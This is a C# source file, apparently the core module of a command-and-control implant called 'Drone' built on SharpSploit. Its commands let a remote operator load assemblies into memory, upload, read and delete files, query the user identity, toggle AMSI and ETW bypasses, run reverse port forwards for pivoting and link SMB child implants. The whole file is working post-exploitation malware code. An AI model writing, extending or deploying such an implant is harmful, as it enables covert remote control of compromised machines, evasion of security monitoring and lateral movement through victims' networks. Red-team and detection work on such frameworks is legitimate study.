using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Principal;
using System.Threading;

using Drone.Handlers;
using Drone.Models;
using Drone.SharpSploit.Enumeration;
using Drone.SharpSploit.Generic;
using Drone.SharpSploit.Pivoting;

namespace Drone.Modules
{
    public class CoreModule : DroneModule
    {
        public override string Name => "core";

        public override List<Command> Commands => new()
        {
            new Command("sleep", "Set sleep interval and jitter", SetSleep, new List<Command.Argument>
            {
                new("interval", false),
                new("jitter")
            }),
            new Command("load-module", "Load an external Drone module", LoadModule, new List<Command.Argument>
            {
                new("/path/to/module.dll", false, true)
            }),
            new Command("abort", "Abort a running task", AbortTask, new List<Command.Argument>
            {
                new("task-guid", false)
            }),
            new Command("pwd", "Print working directory", GetCurrentDirectory),
            new Command("cd", "Change working directory", ChangeCurrentDirectory, new List<Command.Argument>
            {
                new("path")
            }),
            new Command("ls", "List filesystem", GetDirectoryListing, new List<Command.Argument>
            {
                new("path")
            }),
            new Command("upload", "Upload a file to the current working directory of the Drone", UploadFile, new List<Command.Argument>
            {
                new("/path/to/origin", false, true),
                new("destination-filename" ,false)
            }),
            new Command("rm", "Delete a file", DeleteFile, new List<Command.Argument>
            {
                new("/path/to/file", false)
            }),
            new Command("rmdir", "Delete a directory", DeleteDirectory, new List<Command.Argument>
            {
                new("/path/to/directory", false)
            }),
            new Command("mkdir", "Create a directory", CreateDirectory, new List<Command.Argument>
            {
                new("/path/to/new-dir", false) 
            }),
            new Command("cat", "Read a file as text", ReadTextFile, new List<Command.Argument>
            {
                new("/path/to/file.txt")
            }),
            new Command("getuid", "Get current identity", GetCurrentIdentity),
            new Command("bypass", "Set a directive to bypass AMSI/ETW on tasks", SetBypass, new List<Command.Argument>
            {
                new("amsi/etw", false),
                new("true/false")
            }),
            new Command("start-rportfwd", "Start a new reverse port forward", Start,
                new List<Command.Argument>
                {
                    new("bindPort", false),
                    new("forwardHost", false),
                    new("forwardPort", false),
                }),
            new Command("stop-rportfwd", "Stop a reverse port forward", Stop,
                new List<Command.Argument>
                {
                    new("bindPort", false)
                }),
            
            new Command("list-rportfwds", "List all active reverse port forwards", List),
            new Command("purge-rportfwd", "Purge all active reverse port forwards", Purge),
            new Command("rportfwd-inbound", "", HandleInboundResponse, visible: false),
            new Command("link", "Link to an SMB Drone", LinkSmbDrone, new List<Command.Argument>
            {
               new("hostname", false) 
            }),
            new Command("exit", "Exit this Drone", ExitDrone)
        };
        
        private readonly SharpSploitResultList<ReversePortForward> _forwards = new();
        
        private void GetCurrentDirectory(DroneTask task, CancellationToken token)
        {
            var result = Host.GetCurrentDirectory();
            Drone.SendResult(task.TaskGuid, result);
        }
        
        private void ChangeCurrentDirectory(DroneTask task, CancellationToken token)
        {
            var directory = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
            if (task.Arguments.Length > 0) directory = task.Arguments[0];
            
            Host.ChangeCurrentDirectory(directory);
            var current = Host.GetCurrentDirectory();
            
            Drone.SendResult(task.TaskGuid, current);
        }
        
        private void GetDirectoryListing(DroneTask task, CancellationToken token)
        {
            var directory = Host.GetCurrentDirectory();
            if (task.Arguments.Length > 0) directory = task.Arguments[0];

            var result = Host.GetDirectoryListing(directory);
            
            Drone.SendResult(task.TaskGuid, result.ToString());
        }
        
        private void UploadFile(DroneTask task, CancellationToken token)
        {
            var path = Path.Combine(Host.GetCurrentDirectory(), task.Arguments[0]);
            File.WriteAllBytes(path, Convert.FromBase64String(task.Artefact));
        }
        
        private void DeleteFile(DroneTask task, CancellationToken token)
        {
            var path = task.Arguments[0];

            File.Delete(task.Arguments[0]);
            Drone.SendResult(task.TaskGuid, $"{path} deleted.");
        }
        
        private void DeleteDirectory(DroneTask task, CancellationToken token)
        {
            var path = task.Arguments[0];
            
            Directory.Delete(path);
            Drone.SendResult(task.TaskGuid, $"{path} deleted.");
        }
        
        private void CreateDirectory(DroneTask task, CancellationToken token)
        {
            var info = Directory.CreateDirectory(task.Arguments[0]);
            Drone.SendResult(task.TaskGuid, $"{info.FullName} created.");
        }
        
        private void ReadTextFile(DroneTask task, CancellationToken token)
        {
            var text = File.ReadAllText(task.Arguments[0]);
            Drone.SendResult(task.TaskGuid, text);
        }
        
        private void GetCurrentIdentity(DroneTask task, CancellationToken token)
        {
            var identity = WindowsIdentity.GetCurrent().Name;
            Drone.SendResult(task.TaskGuid, identity);
        }
        
        private void SetBypass(DroneTask task, CancellationToken token)
        {
            var config = "";

            if (task.Arguments[0].Equals("amsi", StringComparison.OrdinalIgnoreCase))
                config = "BypassAmsi";

            if (task.Arguments[0].Equals("etw", StringComparison.OrdinalIgnoreCase))
                config = "BypassEtw";

            if (string.IsNullOrEmpty(config))
            {
                Drone.SendError(task.TaskGuid, "Not a valid configuration option");
                return;
            }

            var current = Config.GetConfig<bool>(config);

            if (task.Arguments.Length == 2)
            {
                if (!bool.TryParse(task.Arguments[1], out var enabled))
                {
                    Drone.SendError(task.TaskGuid, $"{task.Arguments[1]} is not a value bool");
                    return;
                }

                Config.SetConfig(config, enabled);
                current = Config.GetConfig<bool>(config);
            }

            Drone.SendResult(task.TaskGuid, $"{config} is {current}");
        }
        
        private void Stop(DroneTask task, CancellationToken token)
        {
            if (!int.TryParse(task.Arguments[0], out var bindPort))
            {
                Drone.SendError(task.TaskGuid, "Not a valid bind port.");
                return;
            }

            var rportfwd = GetReversePortForward(bindPort);
            rportfwd?.Stop();
            
            _forwards.Remove(rportfwd);
        }

        private void Start(DroneTask task, CancellationToken token)
        {
            if (!int.TryParse(task.Arguments[0], out var bindPort))
            {
                Drone.SendError(task.TaskGuid, "Not a valid bind port.");
                return;
            }

            if (!int.TryParse(task.Arguments[2], out var forwardPort))
            {
                Drone.SendError(task.TaskGuid, "Not a valid forward port.");
                return;
            }

            var rportfwd = new ReversePortForward(bindPort, task.Arguments[1], forwardPort);

            var t = new Thread(() => rportfwd.Start());
            t.Start();
            
            _forwards.Add(rportfwd);

            while (!token.IsCancellationRequested)
            {
                if (rportfwd.GetData(out var packet))
                {
                    Drone.SendDroneData(task.TaskGuid, "rportfwd", packet.Serialize());
                }
                
                Thread.Sleep(100);
            }
        }
        
        private void List(DroneTask task, CancellationToken token)
        {
            var list = _forwards.ToString();
            Drone.SendResult(task.TaskGuid, list);
        }
        
        private void Purge(DroneTask task, CancellationToken token)
        {
            foreach (var forward in _forwards) forward.Stop();
            _forwards.Clear();
        }
        
        private void HandleInboundResponse(DroneTask task, CancellationToken token)
        {
            var bindPort = int.Parse(task.Arguments[0]);
            var data = Convert.FromBase64String(task.Arguments[1]);

            var rportfwd = GetReversePortForward(bindPort);
            rportfwd?.SendData(data);
        }

        private ReversePortForward GetReversePortForward(int bindPort)
            => _forwards.SingleOrDefault(r => r.BindPort == bindPort);

        private void SetSleep(DroneTask task, CancellationToken token)
        {
            Config.SetConfig("SleepInterval", Convert.ToInt32(task.Arguments[0]));
            
            if (task.Arguments.Length > 1)
                Config.SetConfig("SleepJitter", Convert.ToInt32(task.Arguments[1]));
        }

        private void LoadModule(DroneTask task, CancellationToken token)
        {
            var bytes = Convert.FromBase64String(task.Artefact);
            var asm = Assembly.Load(bytes);
            
            Drone.LoadDroneModule(asm);
        }

        private void AbortTask(DroneTask task, CancellationToken token)
        {
            Drone.AbortTask(task.Arguments[0]);
        }

        private void LinkSmbDrone(DroneTask task, CancellationToken token)
        {
            var target = task.Arguments[0];
            var handler = new DefaultSmbHandler(target);
            
            Drone.AddChildDrone(handler);
        }

        private void ExitDrone(DroneTask task, CancellationToken token)
        {
            Drone.Stop();
        }
    }
}